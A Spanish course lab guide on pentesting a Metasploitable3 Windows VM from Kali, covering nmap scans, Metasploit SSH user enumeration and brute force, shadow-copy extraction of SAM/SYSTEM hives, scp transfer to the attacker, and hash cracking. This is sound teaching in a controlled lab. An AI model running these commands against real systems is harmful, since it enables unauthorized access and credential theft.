---
title: Clase 03-04 - Pentesting en un Entorno Controlado usando Metasploitable 3
date: 2024-10-03 12:20:00 -0500
categories: [ciberseguridad, pentesting, laboratorio, metasploit, redes y seguridad]
tags: [MITRE ATT&CK, Metasploitable3, Kali Linux, SSH Fuerza Bruta, Nmap, Kill Chain]     # TAG names should always be lowercase
# header-includes:
#     - \usepackage{pdfpages}
---

**LINKS DE LA GRABACIÓN DE LA CLASE**: [Clase 03](https://drive.google.com/file/d/1tbM1LmHAu8VJGTf9TAkIbkcqcxDuRG0h/view?usp=sharing), [Clase 04](https://drive.google.com/file/d/1XAfEo2_aTlIVyf2CKqtlWB2ZAY5agIk2/view?usp=sharing)


# Guía de Laboratorio: Auditoría de Seguridad en un Entorno Controlado usando Metasploitable3

## Resumen del Laboratorio

En esta laboratorio guiado, se llevará a cabo una prueba de pentesting en un entorno controlado con máquinas virtuales (VMs). Se utilizará Kali Linux como máquina atacante y Metasploitable3 como máquina víctima, configurada sobre Windows Server 2008 con el firewall activado. Este laboratorio permite aplicar metodologías de prueba de penetración que simulan una auditoría real, abarcando desde el reconocimiento inicial hasta la explotación básica.

El flujo de ataque sigue las etapas de la cadena de ataque (kill chain) de MITRE ATT&CK, identificando los componentes tangibles en cada fase: Reconocimiento, Escaneo y Enumeración, Acceso Inicial y Explotación.

## Setup

- Atacante: VM Kali Linux con dirección IP 10.0.2.9/24.
- Target: VM Windows Server 2008 con framework Metasploitable 3.
- La configuración Network de las VMs en VirtualBox es en modo `NAT Network`. 

![alt text](/assets/images/setup-lab.png)

## Etapa 1: Reconocimiento

La primera fase consiste en identificar la máquina objetivo dentro de la red y recolectar información básica sobre su configuración.

### 1.1. Configuración del Segmento de Red

- En nuestra VM Kali Linux ejecutamos el siguiente comando para visualizar la dirección IP asignada para la interfaz virtual de red Ethernet.

```bash
└─$ ip addr show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:2e:94:62 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.9/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 569sec preferred_lft 569sec
    inet6 fe80::2655:2243:5e4d:82af/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

- Vemos que la VM de Kali Linux tiene la dirección `10.0.2.9/24`.

- Debido a que la máscara de subred tiene longitud `24`, es decir, es `255.255.255.0`, podemos asumir que el segmento de red es `10.0.2.0/24`.

- Para conocer la dirección IP del metasplotable, ejecutamos `ipconfig`. Tener en cuenta que esta información es referencial y solo la utilizaremos a modo de comprobación. Recordar que el atacante no conoce a primeras cuál es la dirección IP de la VM target.

```bash
PS C:\Users\vagrant> ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : .
   Link-local IPv6 Address . . . . . : fe80::3cbb:f6b4:e297:9a67%11
   IPv4 Address. . . . . . . . . . . : 10.0.2.15
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1

Tunnel adapter isatap..:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```

- Vemos que la ip para el metasploitable 3 es `10.0.2.15/24`.

### 1.2. Comando de Escaneo Inicial con Nmap

- Para identificar dispositivos activos en la red, se utiliza Nmap para hacer un escaneo sin resolución de dominio.

```bash
└─$ sudo nmap -sn 10.0.2.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 16:59 PDT
Nmap scan report for 10.0.2.1
Host is up (0.00028s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.2
Host is up (0.00025s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.3
Host is up (0.00024s latency).
MAC Address: 08:00:27:86:7C:B5 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.15
Host is up (0.00041s latency).
MAC Address: 08:00:27:9B:22:24 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.9
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.00 seconds
```

**Explicación**: El parámetro -sn realiza un escaneo de ping, sin buscar servicios ni puertos abiertos, evitando levantar alertas en los sistemas de firewall y detección de intrusos.

- Vemos que existen las siguientes direcciones:
    - `10.0.2.1`: router virtual que implementa el VirtualBox.
    - `10.0.2.2`: servidor DNS virtual que implementa el VirtualBox.
    - `10.0.2.3`: servidor DHCP virtual implementado por el VirtualBox.

- Concluimos que nuestro target es la dirección ip `10.0.2.15/24`.

### 1.3. Escaneo agresivo

```bash
sudo nmap -A -p- 10.0.2.15
```

**Explicación del Comando**:

- A: Activa el modo agresivo en Nmap, que incluye:
    - Detección de sistema operativo: Intenta identificar el sistema operativo y su versión.
    - Detección de servicios y versiones: Determina qué servicios específicos están corriendo y sus versiones.
    - Script de detección de vulnerabilidades: Utiliza scripts de detección de vulnerabilidades, lo que puede proporcionar detalles adicionales sobre posibles fallos en los servicios detectados.
    - Traceroute: Ayuda a mapear el camino a la máquina objetivo, útil para identificar si hay firewalls adicionales o configuraciones de red específicas.
- p-: Escanea todos los puertos (de 1 a 65535) en lugar de solo los más comunes.

Resultado:

```bash
sudo nmap -A -p- 10.0.2.15
[sudo] password for user: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 17:28 PDT
Nmap scan report for 10.0.2.15
Host is up (0.00044s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 df:ad:f5:41:2b:0e:20:7d:fa:e6:8d:ea:36:e1:8b:4d (RSA)
|_  521 82:d7:58:44:6e:9b:57:a4:a4:c0:28:7f:f4:52:1f:2d (ECDSA)
80/tcp    open  http             Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
1617/tcp  open  java-rmi         Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @192.168.0.10:49192
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
3000/tcp  open  http             WEBrick httpd 1.3.1 (Ruby 2.3.3 (2016-11-21))
|_http-server-header: WEBrick/1.3.1 (Ruby/2.3.3/2016-11-21)
4848/tcp  open  ssl/http         Oracle Glassfish Application Server
|_http-server-header: GlassFish Server Open Source Edition  4.0 
|_ssl-date: 2024-11-01T00:34:24+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2013-05-15T05:33:38
|_Not valid after:  2023-05-13T05:33:38
|_http-title: Did not follow redirect to https://10.0.2.15:4848/
5985/tcp  open  http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8020/tcp  open  http             Apache httpd
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn't have a title (text/html;charset=UTF-8).
|_http-server-header: Apache
8022/tcp  open  http             Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Site doesn't have a title (text/html;charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: PUT DELETE
8027/tcp  open  papachi-p2p-srv?
8080/tcp  open  http             Sun GlassFish Open Source Edition  4.0
|_http-title: GlassFish Server - Server Running
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: GlassFish Server Open Source Edition  4.0 
8282/tcp  open  http             Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/8.0.33
8383/tcp  open  http             Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
| http-methods: 
|_  Potentially risky methods: PUT DELETE
8484/tcp  open  http             Jetty winstone-2.8
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Dashboard [Jenkins]
|_http-server-header: Jetty(winstone-2.8)
8585/tcp  open  http             Apache httpd 2.2.21 ((Win64) PHP/5.3.10 DAV/2)
|_http-server-header: Apache/2.2.21 (Win64) PHP/5.3.10 DAV/2
|_http-title: WAMPSERVER Homepage
9200/tcp  open  wap-wsp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=UTF-8
|     Content-Length: 80
|     handler found for uri [/nice%20ports%2C/Tri%6Eity.txt%2ebak] and method [GET]
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json; charset=UTF-8
|     Content-Length: 316
|     "status" : 200,
|     "name" : "Crimson Cavalier",
|     "version" : {
|     "number" : "1.1.1",
|     "build_hash" : "f1585f096d3f3985e73456debdc1a0745f512bbc",
|     "build_timestamp" : "2014-04-16T14:27:12Z",
|     "build_snapshot" : false,
|     "lucene_version" : "4.7"
|     "tagline" : "You Know, for Search"
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; charset=UTF-8
|     Content-Length: 0
|   RTSPRequest, SIPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain; charset=UTF-8
|_    Content-Length: 0
49153/tcp open  msrpc            Microsoft Windows RPC
49154/tcp open  msrpc            Microsoft Windows RPC
49192/tcp open  java-rmi         Java RMI
49193/tcp open  tcpwrapped
49257/tcp open  msrpc            Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9200-TCP:V=7.94SVN%I=7%D=10/31%Time=67242165%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,193,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20applicatio
SF:n/json;\x20charset=UTF-8\r\nContent-Length:\x20316\r\n\r\n{\r\n\x20\x20
SF:\"status\"\x20:\x20200,\r\n\x20\x20\"name\"\x20:\x20\"Crimson\x20Cavali
SF:er\",\r\n\x20\x20\"version\"\x20:\x20{\r\n\x20\x20\x20\x20\"number\"\x2
SF:0:\x20\"1\.1\.1\",\r\n\x20\x20\x20\x20\"build_hash\"\x20:\x20\"f1585f09
SF:6d3f3985e73456debdc1a0745f512bbc\",\r\n\x20\x20\x20\x20\"build_timestam
SF:p\"\x20:\x20\"2014-04-16T14:27:12Z\",\r\n\x20\x20\x20\x20\"build_snapsh
SF:ot\"\x20:\x20false,\r\n\x20\x20\x20\x20\"lucene_version\"\x20:\x20\"4\.
SF:7\"\r\n\x20\x20},\r\n\x20\x20\"tagline\"\x20:\x20\"You\x20Know,\x20for\
SF:x20Search\"\r\n}\n")%r(HTTPOptions,4F,"HTTP/1\.0\x20200\x20OK\r\nConten
SF:t-Type:\x20text/plain;\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n
SF:")%r(RTSPRequest,4F,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourReq
SF:uest,A9,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=UTF-8\r\nContent-Length:\x2080\r\n\r\nNo\x20handler\x20
SF:found\x20for\x20uri\x20\[/nice%20ports%2C/Tri%6Eity\.txt%2ebak\]\x20and
SF:\x20method\x20\[GET\]")%r(SIPOptions,4F,"HTTP/1\.1\x20200\x20OK\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r
SF:\n");
MAC Address: 08:00:27:9B:22:24 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): VMware ESXi 5.X (88%), Microsoft Windows 2008 (85%)
OS CPE: cpe:/o:vmware:esxi:5.0 cpe:/o:microsoft:windows_server_2008
Aggressive OS guesses: VMware ESXi 5.0 (88%), Microsoft Windows Server 2008 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms 10.0.2.15

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 338.30 seconds
```

### 1.4. Confirmación de Firewall Activo

- Si algunos puertos parecen bloqueados o “filtrados”, se puede confirmar la existencia de un firewall realizando un traceroute.

```bash
traceroute 10.0.2.15
```

**Explicación**: La falta de respuesta después de múltiples saltos puede indicar un firewall que está filtrando el tráfico entrante. Este comportamiento es característico de dispositivos protegidos en redes empresariales.

## Etapa 2: Escaneo y Enumeración

Una vez identificada la máquina objetivo y confirmada la presencia de un firewall, se realiza un análisis más detallado para descubrir servicios específicos y versiones.

### 2.1. Escaneo Detallado de Servicios y Versiones con Nmap

- Aquí se ejecuta un escaneo con opciones que permiten identificar el tipo de servicio y su versión.

- Escaneo a servicio SSH:

```bash
$ sudo nmap -sV -p 22 10.0.2.15
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 17:40 PDT
Nmap scan report for 10.0.2.15
Host is up (0.00050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.1 (protocol 2.0)
MAC Address: 08:00:27:9B:22:24 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
```

**Explicación**: La opción -sV permite identificar la versión de los servicios en los puertos activos. Esto proporciona una base para buscar posibles vulnerabilidades conocidas.

- Aquí, es correcto afirmar que la versión OpenSSH 7.1 (protocol 2.0), en su configuración por defecto, **permite múltiples intentos de autenticación sin implementar un mecanismo de bloqueo temporal o permanente para el usuario**. Esta característica configura una vulnerabilidad en el servicio de autenticación de OpenSSH, que puede ser explotada mediante un ataque de fuerza bruta para intentar acceder a las credenciales de un usuario arbitrario.

- En términos académicos, esta vulnerabilidad se clasifica como una **falta de control de tasa de intentos** (lack of rate limiting) o **ausencia de mecanismos de bloqueo en autenticación fallida**. Esto significa que, debido a la configuración predeterminada, el servicio permite intentos ilimitados de autenticación, lo cual expone al sistema a riesgos de ataques de fuerza bruta y ataques de diccionario. En tales ataques, el atacante puede automatizar múltiples combinaciones de nombres de usuario y contraseñas sin ser bloqueado, lo que incrementa las posibilidades de comprometer una cuenta mediante la obtención de credenciales válidas.

- Entre estas **medidas ausentes** se incluyen:

    - Límites en la cantidad de intentos de autenticación permitidos por cada sesión o en un período específico de tiempo.
    - Implementación de retrasos progresivos tras intentos fallidos de autenticación, lo cual ralentizaría la velocidad de un ataque de fuerza bruta.
    - Bloqueo temporal de la cuenta tras varios intentos fallidos, lo cual ayudaría a detener intentos de autenticación no autorizados.

### 2.2. Explotación de la Vulnerabilidad

- La falta de estas configuraciones de seguridad permite a un atacante realizar intentos repetitivos y automatizados de autenticación mediante herramientas de fuerza bruta, como hydra o medusa, en las cuales se pueden probar cientos de combinaciones de usuario/contraseña en cortos períodos de tiempo. Esta situación se considera una debilidad inherente en el sistema de autenticación de OpenSSH 7.1 (protocol 2.0), especialmente si no se implementan configuraciones personalizadas que limiten los intentos.

## Etapa 3: Acceso Inicial

Con la información obtenida sobre los servicios en ejecución, se pasa a intentar obtener acceso inicial al sistema a través del servicio SSH.

### 3.1. Descarga de diccionarios

- En esta etapa, se utiliza Metasploit para enumerar usuarios válidos en el servicio SSH del sistema objetivo, lo que es parte de la recolección activa de información.

- Repositorios de diccionarios útiles para este laboratorio:
    - [SecLists de Daniel Missler](https://github.com/danielmiessler/SecLists)
    - [Rockyou Dictionary](https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz)

- **NOTA: Ver el vídeo de la clase para entender la adaptación que realizamos en base a los diccionarios descargados.**

- Por ejemplo, al descargar el diccionario **Rockyou** en el Kali Linux, lo descomprimimos:

```
gzip -dk rockyou.txt.gz 
```

y luego nos aseguramos de que contenga al usuario `vagrant`.

```
cat rockyou.txt | grep vagrant
vagrant             <<<<<
vagrantz
vagrantstory
vagranteh
vagrant86
vagrant81
vagrant20052528
vagrant187
vagrant15
vagrant06
thevagrants
```

- Es importante aquí resaltar que nos hemos asegurado de que el usuario `vagrant` esté en el diccionario para el éxito de este laboratorio. Sin embargo, en un escenario real, es muy probable que Ud. tenga que construir una lista de usuarios basados en las políticas de creación de usuario de la entidad sobre la cual se esté realizando la prueba de pentesting, y ello puede implicar hacer uso de Ingeniería Social.

### 3.2. Enumeración de Usuarios con Metasploit

- Para enumerar los usuarios habilitados en el servicio SSH en la máquina target, vamos a correr un scanner de enumeración con la herramienta Metasploit.

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 10.0.2.15
set USER_FILE /path/to/usernames.txt
run
```
**Explicación**: Este módulo de Metasploit permite enumerar usuarios válidos en el servicio SSH, utilizando una lista de usuarios comunes. La detección de nombres de usuario es esencial para los siguientes intentos de autenticación.

Resultado:

```bash
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 10.0.2.15
RHOSTS => 10.0.2.15
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /home/user/Downloads/top-usernames-shortlist.txt
USER_FILE => /home/user/Downloads/top-usernames-shortlist.txt
msf6 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] 10.0.2.15:22 - SSH - Using malformed packet technique
[*] 10.0.2.15:22 - SSH - Checking for false positives
[*] 10.0.2.15:22 - SSH - Starting scan
[+] 10.0.2.15:22 - SSH - User 'vagrant' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- En este caso, estamos usando el diccionario `top-usernames-shorlist.txt` localizado en la carpeta `SecLists\Usernames` del repositorio de Daniel Missler ([Link](https://github.com/danielmiessler/SecLists/tree/master/Usernames)).

- Vemos que el script de Metasploit ha encontrado un usuario válido (`vagrant`), por lo que ahora es cuestión de encontrar la contraseña de este usuario para poder tener acceso vía ssh a la máquina target.

- Dado que no hay restricciones en los intentos de autenticación, podemos realizar un ataque de fuerza bruta sobre los posibles passwords del usuario `vagrant`.

### 3.3. Ataque de Fuerza Bruta en SSH

- Una vez identificados los usuarios válidos, se utiliza un ataque de fuerza bruta para intentar obtener contraseñas.

- Para ello, utilizaremos el script `ssh_login` de Metasploit, el cual nos permitirá realizar los múltiples intentos de autenticación sobre el usuario `vagrant` con todos los potenciales passwords listados en el archivo `path/to/passwords.txt`.

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.2.15
set USERNAME vagrant
set PASS_FILE /path/to/passwords.txt
set VERBOSE true
run
```
**Explicación**: Este módulo intenta varias combinaciones de usuarios y contraseñas usando un diccionario de contraseñas. Esto puede permitir el acceso inicial al sistema si alguna combinación es correcta.

- En este caso, especificamos el USERNAME con el usuario `vagrant` debido a que solo hemos encontrado un usuario enumerado en el paso anterior. Sin embargo, es posible que, en el paso de enumeración de usuarios, encontremos diferentes usuarios, con lo cual tendremos que hacer una lista de usuarios encontrados. Cuando, en vez de atacar un usuario en específico, se necesite atacar a una lista de usuarios, debemos especificar esta lista en el parámetro `USER_FILE`. Esta información la puede obtener al realizar un `show options`.

- Resultado:


## Etapa 4: Explotación y Acceso

Tras obtener una combinación de usuario y contraseña válida, se realiza la conexión y la explotación del sistema.

### 4.1. Conexión SSH

- Con el usuario y la contraseña obtenidos, se establece una conexión SSH al sistema objetivo.

```bash
ssh vagrant@10.0.2.15
password: ***********
```

**Explicación**: Este comando establece una conexión remota al servidor, permitiendo la ejecución de comandos en la máquina comprometida.

## Paso 5: Extracción de Archivos SAM y SYSTEM usando vssown.vbs

Una vez que tienes acceso al sistema a través de SSH u otro método en Metasploitable3, puedes proceder con los siguientes pasos:

### 5.1. Comprueba los Privilegios

- Es importante verificar si tenemos privilegios suficientes (privilegios de administrador) para ejecutar el script de **Volume Shadow Copy Service (VSS)**. Si no tenemos privilegios de administrador, es posible que necesitemos ejecutar técnicas de escalación de privilegios antes de proceder.

```powershell
whoami /priv
.
.
.
SeBackupPrivilege               Back up files and directories             Enabled 
SeRestorePrivilege              Restore files and directories             Enabled 
.
.
.
```

- Si tenemos privilegios de administrador, deberíamos ver permisos como `SeBackupPrivilege`, `SeRestorePrivilege`, etc.

### 5.2. Localiza el Script vssown.vbs

- Asegurar de que el script `vssown.vbs` esté disponible en el sistema al que tenemos acceso. Este script permite crear una copia de sombra del sistema para acceder a archivos protegidos.

- Si el archivo no está presente, copiar el script a la máquina víctima. Podemos usar herramientas como scp (si tienes acceso SSH) o upload desde dentro de un meterpreter session en Metasploit.

```bash
scp vssown.vbs usuario@10.0.2.15:C:\\Windows\\Temp
```

Una vez transferido, navega hasta el directorio donde se encuentra el script.

### 3. Ejecuta el script vssown.vbs 

Para crear la copia shadow que contendrá los archivos SAM y SYSTEM. En PowerShell o la línea de comandos de Windows, usa:

```powershell
cscript C:\Windows\Temp\vssown.vbs
```

**Nota**: cscript es el intérprete para ejecutar archivos .vbs. Este comando le indica a Windows que ejecute el script VBS.

### 4. Localiza la Ruta de la Copia de Sombra

El script vssown.vbs generará una salida con la ubicación de la copia de sombra. Anotar esta ruta, ya que será la ubicación donde podremos acceder a los archivos SAM y SYSTEM sin restricciones.

### 5. Copia los Archivos SAM y SYSTEM

Ahora que tenemos la ruta de la copia de sombra, navegar a esta ubicación y copia los archivos SAM y SYSTEM a un directorio accesible para su posterior extracción:

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SAM C:\Windows\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM
```


**Nota**: Reemplazar `HarddiskVolumeShadowCopyX` con el número correspondiente que el script vssown.vbs nos indicó.

### 6. Transfiere los Archivos SAM y SYSTEM a tu Máquina

Usar scp o descarga los archivos SAM y SYSTEM desde la máquina víctima a tu máquina atacante para realizar el análisis de los hashes de contraseñas:

```powershell
scp usuario@192.168.122.175:C:\Windows\Temp\SAM /path/to/local/directory
scp usuario@192.168.122.175:C:\Windows\Temp\SYSTEM /path/to/local/directory
```

### 7. Extracción de Hashes

Con los archivos SAM y SYSTEM en tu máquina atacante, puedes usar herramientas como samdump2 junto con John the Ripper o Hashcat para extraer y crackear los hashes.

#### Extracción de hashes usando samdump2:

```bash
samdump2 SYSTEM SAM > hashes.txt
```

#### Crackeo de Hashes usando John the Ripper:

```bash
john --format=NT hashes.txt
```

o con Hashcat:

```bash
hashcat -m 1000 hashes.txt /path/to/wordlist
```

**Resumen**:
Estos pasos permiten la creación de una copia de sombra en Windows mediante vssown.vbs, facilitando el acceso a los archivos SAM y SYSTEM que contienen los hashes de contraseñas de los usuarios. El proceso continúa con la transferencia de estos archivos al entorno de ataque para su análisis y posterior crackeo. Este procedimiento se alinea con la etapa de exfiltración de credenciales dentro de un entorno controlado en el flujo de un ataque ético.

## Conclusión y Recomendaciones

Este laboratorio guiado ha cubierto las principales etapas de la cadena de ataque de MITRE ATT&CK en un entorno simulado, pasando por reconocimiento, escaneo, acceso inicial y explotación básica. Esta práctica proporciona experiencia en la identificación de servicios, evasión de firewall, recolección de información mediante enumeración y obtención de acceso mediante fuerza bruta en SSH. Los pasos aquí seguidos permiten desarrollar habilidades esenciales para el pentesting en entornos empresariales.